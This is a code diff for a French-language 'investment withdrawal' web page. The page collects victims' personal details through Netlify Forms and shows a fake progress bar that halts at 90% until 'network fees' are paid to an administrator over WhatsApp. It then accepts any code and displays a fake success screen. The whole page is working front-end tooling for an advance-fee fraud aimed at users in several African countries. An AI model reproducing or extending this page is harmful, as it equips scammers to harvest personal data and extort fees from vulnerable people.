@@ -2,35 +2,444 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <title>Retrait - Global Trade Inc</title>
-  <link rel="stylesheet" href="style.css">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Retrait d’investissement</title>
+  <!-- Styles intégrés pour éviter dossier CSS -->
+  <style>
+    /* Reset minimal */
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f5f5f5;
+      color: #333;
+      line-height: 1.6;
+    }
+
+    /* Header en-tête */
+    header.site-header {
+      width: 100%;
+      height: 200px;
+      /* Si vous avez un fichier header.jpg à la racine, le référencer ainsi : */
+      background-image: url('header.jpg');
+      background-size: cover;
+      background-position: center;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    header.site-header h1 {
+      color: #fff;
+      background-color: rgba(0,0,0,0.5);
+      padding: 10px 20px;
+      border-radius: 5px;
+    }
+
+    .container {
+      max-width: 600px;
+      margin: 30px auto;
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 5px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+    }
+
+    form label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: bold;
+    }
+    form input[type="text"],
+    form input[type="number"],
+    form select {
+      width: 100%;
+      padding: 8px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    form input[type="tel"] {
+      width: calc(100% - 60px);
+      padding: 8px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      margin-left: 60px;
+    }
+    .phone-prefix {
+      position: relative;
+      margin-bottom: 15px;
+    }
+    .phone-prefix span {
+      position: absolute;
+      left: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 14px;
+      color: #555;
+    }
+    .phone-prefix input {
+      padding-left: 50px;
+    }
+
+    button, input[type="submit"] {
+      background-color: #007bff;
+      color: white;
+      border: none;
+      padding: 10px 15px;
+      cursor: pointer;
+      border-radius: 4px;
+      font-size: 16px;
+    }
+    button:hover, input[type="submit"]:hover {
+      background-color: #0056b3;
+    }
+
+    /* Modal overlay */
+    .modal-overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background-color: rgba(0,0,0,0.6);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      visibility: hidden;
+      opacity: 0;
+      transition: opacity 0.2s ease;
+    }
+    .modal-overlay.active {
+      visibility: visible;
+      opacity: 1;
+    }
+    .modal-content {
+      background-color: #fff;
+      padding: 20px;
+      width: 90%;
+      max-width: 400px;
+      border-radius: 5px;
+      text-align: center;
+    }
+    .progress-bar-container {
+      width: 100%;
+      background-color: #e0e0e0;
+      border-radius: 4px;
+      overflow: hidden;
+      margin: 20px 0;
+    }
+    .progress-bar {
+      width: 0%;
+      height: 20px;
+      background-color: #28a745;
+      transition: width 0.3s ease;
+    }
+
+    /* Section succès inline */
+    #success-section {
+      display: none;
+      margin-top: 20px;
+      text-align: center;
+    }
+    body.success-mode {
+      /* Si vous avez success-bg.jpg à la racine, remplacez ou retirez */
+      background-image: url('success-bg.jpg');
+      background-size: cover;
+      background-position: center;
+      color: #fff;
+    }
+    body.success-mode .container {
+      background-color: rgba(0,0,0,0.6);
+      color: #fff;
+    }
+
+    /* Petit lien sous le formulaire initial */
+    #initial-section p a {
+      color: #007bff;
+      text-decoration: none;
+    }
+    #initial-section p a:hover {
+      text-decoration: underline;
+    }
+  </style>
 </head>
-<body>
-  <div class="form-container">
-    <h1>Demande de Retrait</h1>
-    <form onsubmit="return validerCode(event)">
-      <label>Montant :</label>
-      <input type="number" required><br>
+<body id="page-index">
+  <header class="site-header">
+    <h1>Retrait d’investissement</h1>
+  </header>
 
-      <label>Code de Retrait :</label>
-      <input type="text" id="code" required><br>
+  <div class="container">
+    <!-- SECTION 1 : Formulaire initial -->
+    <div id="initial-section">
+      <form id="withdrawal-form" name="withdrawal-request" data-netlify="true" netlify-honeypot="bot-field">
+        <!-- Netlify Forms -->
+        <input type="hidden" name="form-name" value="withdrawal-request">
+        <p style="display:none">
+          <label>Ne pas remplir <input name="bot-field"></label>
+        </p>
 
-      <button type="submit">Valider</button>
-    </form>
+        <label for="firstName">Prénom</label>
+        <input type="text" id="firstName" name="firstName" required>
+
+        <label for="lastName">Nom</label>
+        <input type="text" id="lastName" name="lastName" required>
+
+        <label for="country">Pays</label>
+        <select id="country" name="country" required>
+          <option value="">Sélectionnez votre pays</option>
+          <!-- options ajoutées par JS -->
+        </select>
+
+        <label for="phone">Téléphone</label>
+        <div class="phone-prefix">
+          <span id="phone-prefix">+XXX</span>
+          <input type="tel" id="phone" name="phone" placeholder="Votre numéro sans indicatif" required>
+        </div>
+
+        <label for="amount">Montant à retirer</label>
+        <input type="number" id="amount" name="amount" min="1" required>
+        <small>Note : des frais de réseau s’appliquent et devront être soldés auprès de l’administrateur.</small>
+
+        <label for="currency">Devise</label>
+        <select id="currency" name="currency" required>
+          <option value="">Sélectionnez</option>
+          <option value="FCFA">FCFA</option>
+          <option value="USD">USD</option>
+        </select>
+
+        <label for="profession">Métier</label>
+        <input type="text" id="profession" name="profession" required>
+
+        <label for="age">Âge</label>
+        <input type="number" id="age" name="age" min="18" required>
+
+        <label for="investmentCode">Code d’investissement initial</label>
+        <input type="text" id="investmentCode" name="investmentCode" required>
+        <small>Ce code initial doit vous avoir été communiqué par l’administrateur avant cette étape.</small>
+
+        <input type="submit" value="Valider la demande">
+      </form>
+      <!-- Lien pour sauter directement à la saisie du code, si déjà soldé hors-ligne -->
+      <p style="margin-top:10px;">
+        Vous avez déjà soldé les frais ? 
+        <a href="#" id="showCodeDirect">Cliquez ici pour saisir votre code</a>
+      </p>
+    </div>
+
+    <!-- SECTION 2 : saisie du code après paiement hors-ligne -->
+    <div id="code-section" style="display: none;">
+      <p>Vous avez reçu votre nouveau code de confirmation ? Saisissez-le ci-dessous :</p>
+      <form id="confirm-form">
+        <label for="newInvestmentCode">Nouveau code d’investissement</label>
+        <input type="text" id="newInvestmentCode" name="newInvestmentCode" required>
+        <input type="submit" value="Valider le code">
+      </form>
+      <p id="confirmError" style="color:red; display:none;">Veuillez saisir un code valide.</p>
+    </div>
+
+    <!-- SECTION 3 : Succès (affichée en fin) -->
+    <div id="success-section">
+      <h2>Félicitations ! Votre retrait est finalisé</h2>
+      <p>Votre demande de retrait a été traitée avec succès. L’administrateur a confirmé la réception des frais et validé votre transaction.</p>
+      <p>Le montant sera versé selon les modalités convenues.</p>
+      <p>Pour toute question supplémentaire, contactez de nouveau l’administrateur.</p>
+    </div>
   </div>
 
-  <script>
-    function validerCode(event) {
-      event.preventDefault();
-      const codeSaisi = document.getElementById('code').value;
-      const codeCorrect = "12345"; // le code que TU définis
+  <!-- Modal de progression unique -->
+  <div id="progressModal" class="modal-overlay">
+    <div class="modal-content">
+      <p id="progressText">Traitement en cours...</p>
+      <div class="progress-bar-container">
+        <div id="progressBar" class="progress-bar"></div>
+      </div>
+      <div id="feeSection" style="display: none;">
+        <p class="fee-message">
+          La progression s’est arrêtée à 90 % car vous n’avez pas soldé les frais de réseau.<br>
+          Veuillez contacter l’administrateur pour solder ces frais :<br>
+          Email : <a href="mailto:admin@votre-domaine.com">admin@votre-domaine.com</a><br>
+          WhatsApp : +237 6XXXXXXX
+        </p>
+        <button id="haveCodeBtn">J’ai réglé, j’ai un code</button>
+      </div>
+    </div>
+  </div>
 
-      if (codeSaisi === codeCorrect) {
-        window.location.href = "retour.html";
-      } else {
-        alert("Code invalide !");
+  <!-- Mapping pays-indicatif et logique JS inline -->
+  <script>
+    // Mapping simple pays → indicatif
+    const countryDialCodes = [
+      { name: "Cameroun", code: "CM", dial_code: "+237" },
+      { name: "Nigeria", code: "NG", dial_code: "+234" },
+      { name: "Ghana", code: "GH", dial_code: "+233" },
+      { name: "Kenya", code: "KE", dial_code: "+254" },
+      { name: "Côte d'Ivoire", code: "CI", dial_code: "+225" },
+      { name: "Sénégal", code: "SN", dial_code: "+221" },
+      { name: "Mali", code: "ML", dial_code: "+223" },
+      { name: "République démocratique du Congo", code: "CD", dial_code: "+243" },
+      { name: "Rwanda", code: "RW", dial_code: "+250" },
+      { name: "Ouganda", code: "UG", dial_code: "+256" }
+      // Ajoutez d’autres pays si nécessaire
+    ];
+
+    document.addEventListener('DOMContentLoaded', () => {
+      // Remplir le select pays et gérer indicatif
+      const countrySelect = document.getElementById('country');
+      const phonePrefixSpan = document.getElementById('phone-prefix');
+      if (countrySelect && phonePrefixSpan) {
+        countryDialCodes.forEach(item => {
+          const option = document.createElement('option');
+          option.value = item.code;
+          option.textContent = item.name;
+          option.dataset.dialCode = item.dial_code;
+          countrySelect.appendChild(option);
+        });
+        countrySelect.addEventListener('change', () => {
+          const sel = countrySelect.selectedOptions[0];
+          phonePrefixSpan.textContent = (sel && sel.dataset.dialCode) ? sel.dataset.dialCode : '+XXX';
+        });
       }
-    }
+
+      // Récupérer éléments des sections
+      const initialSection = document.getElementById('initial-section');
+      const codeSection = document.getElementById('code-section');
+      const successSection = document.getElementById('success-section');
+      const withdrawalForm = document.getElementById('withdrawal-form');
+      const confirmForm = document.getElementById('confirm-form');
+      const confirmError = document.getElementById('confirmError');
+      const showCodeDirect = document.getElementById('showCodeDirect');
+      const modal = document.getElementById('progressModal');
+      const progressBar = document.getElementById('progressBar');
+      const progressText = document.getElementById('progressText');
+      const feeSection = document.getElementById('feeSection');
+      const haveCodeBtn = document.getElementById('haveCodeBtn');
+
+      // Lien “Cliquez ici pour saisir votre code”
+      if (showCodeDirect) {
+        showCodeDirect.addEventListener('click', (e) => {
+          e.preventDefault();
+          if (initialSection) initialSection.style.display = 'none';
+          if (codeSection) codeSection.style.display = 'block';
+        });
+      }
+
+      // Soumission du formulaire initial
+      if (withdrawalForm) {
+        withdrawalForm.addEventListener('submit', function(e) {
+          e.preventDefault();
+          // Envoi Netlify Forms pour garder trace (optionnel)
+          const formData = new FormData(withdrawalForm);
+          const data = {};
+          formData.forEach((v,k) => { data[k] = v; });
+          data['form-name'] = withdrawalForm.getAttribute('name');
+          const encode = (obj) => Object.keys(obj)
+            .map(k => encodeURIComponent(k)+'='+encodeURIComponent(obj[k])).join('&');
+          fetch('/', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: encode(data)
+          }).then(()=>console.log("Envoyé à Netlify Forms"))
+            .catch(err=>console.error("Erreur Netlify Forms:", err));
+
+          // Lancer modal + progression jusqu’à 90%
+          showProgressModal();
+        });
+      }
+
+      // Bouton “J’ai réglé, j’ai un code”
+      if (haveCodeBtn) {
+        haveCodeBtn.addEventListener('click', () => {
+          hideProgressModal();
+          if (initialSection) initialSection.style.display = 'none';
+          if (codeSection) codeSection.style.display = 'block';
+        });
+      }
+
+      // Soumission du code
+      if (confirmForm) {
+        confirmForm.addEventListener('submit', (e) => {
+          e.preventDefault();
+          const codeInput = document.getElementById('newInvestmentCode');
+          const code = codeInput ? codeInput.value.trim() : '';
+          if (!code) {
+            if (confirmError) {
+              confirmError.textContent = "Veuillez saisir le code.";
+              confirmError.style.display = 'block';
+            } else {
+              alert("Veuillez saisir le code.");
+            }
+            return;
+          }
+          // Optionnel : valider un pattern minimal, ex. /^[A-Z0-9]{6,8}$/ 
+          if (confirmError) confirmError.style.display = 'none';
+          showFinalProgress();
+        });
+      }
+
+      // Fonctions modal et progression
+      function showProgressModal() {
+        if (!modal || !progressBar || !progressText || !feeSection) return;
+        modal.classList.add('active');
+        feeSection.style.display = 'none';
+        progressBar.style.width = '0%';
+        progressText.textContent = 'Traitement en cours...';
+
+        let prog = 0;
+        const target = 90;
+        const interval = 50;
+        const step = 1;
+        const timer = setInterval(() => {
+          if (prog < target) {
+            prog += step;
+            progressBar.style.width = prog + '%';
+          } else {
+            clearInterval(timer);
+            progressText.textContent = `Progression : ${target}%`;
+            feeSection.style.display = 'block';
+          }
+        }, interval);
+      }
+
+      function showFinalProgress() {
+        if (!modal || !progressBar || !progressText) return;
+        modal.classList.add('active');
+        progressBar.style.width = '0%';
+        progressText.textContent = 'Finalisation en cours...';
+        if (feeSection) feeSection.style.display = 'none';
+
+        let prog = 0;
+        const target = 100;
+        const interval = 30;
+        const step = 2;
+        const timer = setInterval(() => {
+          if (prog < target) {
+            prog += step;
+            if (prog > target) prog = target;
+            progressBar.style.width = prog + '%';
+            progressText.textContent = `Progression : ${prog}%`;
+          } else {
+            clearInterval(timer);
+            setTimeout(() => {
+              hideProgressModal();
+              enterSuccessMode();
+            }, 500);
+          }
+        }, interval);
+      }
+
+      function hideProgressModal() {
+        if (!modal) return;
+        modal.classList.remove('active');
+      }
+
+      function enterSuccessMode() {
+        if (initialSection) initialSection.style.display = 'none';
+        if (codeSection) codeSection.style.display = 'none';
+        if (successSection) successSection.style.display = 'block';
+        document.body.classList.add('success-mode');
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+      }
+    });
   </script>
 </body>
 </html>
